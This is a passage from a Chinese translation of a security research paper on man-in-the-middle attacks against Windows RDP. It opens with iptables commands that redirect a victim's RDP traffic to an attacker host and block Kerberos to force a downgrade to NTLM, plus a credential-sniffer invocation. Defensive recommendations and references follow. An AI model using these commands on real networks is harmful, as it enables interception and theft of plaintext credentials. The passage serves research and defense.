    $ iptables -t nat -A PREROUTING -p tcp -d "$ORIGINAL_DEST" 
    -s "$VICTIM_IP" --dport 3389 -j DNAT --to-destination "$ATTACKER_IP"
为了强制从Kerberos降级到NTLM，我们可以将受害者发送到88端口的所有TCP流量全部拦截：
    $ iptables -A INPUT -p tcp -s "$VICTIM_IP" --dport 88 
    -j REJECT --reject-with tcp-reset
这样，我们就掌握了运行Python脚本所需的全部信息：
    $ rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST"
图6：左侧：受害者看到的域控制器的RDP会话。右侧：攻击者看到的明文密码。
**建议**
那么，作为系统管理员你可能想知道，应该采取哪些行动来保护自己网络的安全。
首先，如果服务器的身份不能被验证，即如果SSL证书没有被可信证书颁发机构（CA）签名，则拒绝RDP连接是绝对关键的。您必须使用企业CA来签署所有服务器证书。如果无法验证证书，则客户端必须通过GPO
[22]配置为禁止连接：
在服务器端是否执行CredSSP（NLA）的问题是非常棘手的。为了便于记录，这也可以作为组策略[20]推出：
我们已经看到，客户端会缓存用户的凭据，以便在NLA不可用的情况下方便地重新传输它们——我们知道，这些凭据就位于内存中。因此，它们可能被具有SYSTEM权限的攻击者读取，例如使用Mimikatz
[24]等。这是一个令人难以置信的常见网络攻击情形：攻陷一台机器，利用Mimikatz提取登录用户的明文凭证，并通过横向运动攻击其他帐户，直到找到域管理员密码为止。这就是为什么你只能在域控制器上使用你的个人域管理员帐户，而不应该在其他地方使用的原因。
但是如果使用RDP远程进入域控制器则会在工作站上留下高权限帐户的痕迹，这是一个严重的问题。此外，如果您强制执行NLA，在启用“用户必须在下次登录时更改密码”选项后，那么只能使用终端服务器的用户会被锁定。我们知道，NLA的唯一优点是更轻便，可以减轻拒绝服务攻击的影响，因为它占用较少的资源，并且可以保护RDP免受基于网络的攻击，如MS12-020
[25]。这就是为什么目前我们正在讨论是否建议禁用RDA的NLA的原因。
如果您希望避免使用NLA，请将组策略“要求为远程连接使用特定安全层”设置为SSL [20]。
为了进一步增加RDP连接的安全性，您可以采取的另一项措施是，除了用户凭证之外，为用户验证添加其他验证因子。目前有许多相关的第三方产品，至少在保护关键系统如域控制器的时候，您可以考虑这一措施。
如果你的Linux机器是通过RDP连接到Windows终端服务器的话，我需要提醒的是，流行的RDP客户端rdesktop不支持NLA，并且根本不对SSL证书进行验证。所以我建议使用xfreerdp，至少它会验证SSL证书。
最后，鼓励大家对您的同事和用户不断重申：不要轻视SSL警告，无论是在RDP或HTTPS或其他任何情况下。作为管理员，您有责任确保您的客户端系统在受信任的CA列表中含有您的根CA。这样，这些警告就属于异常，需要马上通知IT部门。
如果您有任何其他问题或意见，请随时与我们联系。
图7：一个关键的GPO设置：为客户端配置服务器验证
**参考资料**
[1] Vollmer, A., Github.com: Seth (2017),  (Cited onpage 2.)
[2] Montoro M., Cain & Abel (2014),  (Cited on
page 2.)
[3] Wikipedia contributors, Finite group,
[https://en.wikipedia.org/w/index.php?title=Finite_group&oldid=768290355](https://en.wikipedia.org/w/index.php?title=Finite_group&oldid=768290355)
(accessed March 8, 2017) (Cited on page 5.)
[4] Wikipedia contributors, Shor’s algorithm (accessed March 8, 2017),
[https://en.wikipedia.org/w/index.php?title=Shor%27s_algorithm&oldid=767553912](https://en.wikipedia.org/w/index.php?title=Shor%27s_algorithm&oldid=767553912)
(Cited on page 5.)
[5] Shor, P. W., Polynomial-Time Algorithms for Prime Factorization and
Discrete Logarithms on a QuantumComputer (1995),  (Cited on page 5.)
[6] Microsoft Developer Network, [MS-RDPBCGR]: Non-FIPS (2017),
[https://msdn.microsoft.com/en-us/library/cc240785.aspx](https://msdn.microsoft.com/en-us/library/cc240785.aspx) (Cited on pages 6 and 9.)
[7] Schneier, B., Why Cryptography Is Harder Than It Looks (1997),
[https://www.schneier.com/essays/archives/1997/01/why_cryptography_is.html
](https://www.schneier.com/essays/archives/1997/01/why_cryptography_is.html)(Cited
on page 6.)
[8] Microsoft Developer Network, [MS-RDPBCGR]: Terminal Services Signing Key
(2017), [https://msdn.microsoft.com/en-us/library/cc240776.aspx](https://msdn.microsoft.com/en-us/library/cc240776.aspx) (Cited on pages 6 and 8.)
[9] Microsoft Developer Network, [MS-RDPBCGR]: Encrypting and Decrypting the
I/O Data Stream (2017),[https://msdn.microsoft.com/en-us/library/cc240787.aspx](https://msdn.microsoft.com/en-us/library/cc240787.aspx) (Cited on page 6.)
[10] Microsoft Developer Network, [MS-RDPBCGR]: Server Security Data
(TS_UD_SC_SEC1) (2017), [https://msdn.microsoft.com/en-us/library/cc240518.aspx](https://msdn.microsoft.com/en-us/library/cc240518.aspx) (Cited on page 7.)
[11] Microsoft Developer Network, [MS-RDPBCGR]: Signing a Proprietary
Certificate (2017), [https://msdn.microsoft.com/en-us/library/cc240778.aspx](https://msdn.microsoft.com/en-us/library/cc240778.aspx) (Cited on page 8.)
[12] Microsoft Developer Network, [MS-RDPBCGR]: Client Input Event PDU Data
(TS_INPUT_PDU_DATA)(2017),  (Cited on page 10.)
[13] Microsoft Developer Network, [MS-RDPBCGR]: Keyboard Event
(TS_KEYBOARD_EVENT) (2017), [https://msdn.microsoft.com/en-us/library/cc240584.aspx](https://msdn.microsoft.com/en-us/library/cc240584.aspx) (Cited on page 11.)
[14] Brouwer, A., Keyboard Scancodes (2009),
[https://www.win.tue.nl/~aeb/linux/kbd/scancodes-10.html#ss10.6](https://www.win.tue.nl/~aeb/linux/kbd/scancodes-10.html#ss10.6)
(Cited on page 11.)
[15] Microsoft Developer Network, Microsoft NTLM (2017),
[https://msdn.microsoft.com/en-us/library/aa378749%28VS.85%29.aspx](https://msdn.microsoft.com/en-us/library/aa378749%28VS.85%29.aspx) (Cited on page 14.)
[16] Weeks, M., Attacking Windows Fallback Authentication (2015),
[https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf](https://www.root9b.com/sites/default/files/whitepapers/R9B_blog_003_whitepaper_01.pdf)
(Cited on page 14.)
[17] Hashcat,  (Cited on page 14.)
[18] John The Ripper,  (Cited on page 14.)
[19] Microsoft Developer Network, [MS-CSSP]: TSRequest (2017),
[https://msdn.microsoft.com/enus/library/cc226780.aspx](https://msdn.microsoft.com/enus/library/cc226780.aspx)
(Cited on page 15.)
[20] Microsoft Technet, Security (2017), [https://technet.microsoft.com/en-us/library/cc771869(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc771869\(v=ws.10\).aspx) (Cited on page 18.)
[21] Microsoft Technet, Network Security: Restrict NTLM: NTLM authentication
in this domain (2017), [https://technet.microsoft.com/en-us/library/jj852241(v=ws.11).aspx](https://technet.microsoft.com/en-us/library/jj852241\(v=ws.11\).aspx) (Not cited.)
[22] Microsoft Technet, Remote Desktop Connection Client (2017),
[https://technet.microsoft.com/en-us/library/cc753945(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc753945\(v=ws.10\).aspx) (Cited on page 18.)
[23] Vollmer, A., Github.com: clone-cert.sh (2017), [https://github.com/SySS-Research/clonecert](https://github.com/SySS-Research/clonecert) (Cited on page
16.)
[24] Delpy, B., Github.com: mimikatz (2017),
 (Cited onpage 18.)
[25] Microsoft Technet, Security Bulletin MS12-020 (2012),
[https://technet.microsoft.com/enus/library/security/ms12-020.aspx](https://technet.microsoft.com/enus/library/security/ms12-020.aspx)
(Cited on page 18.)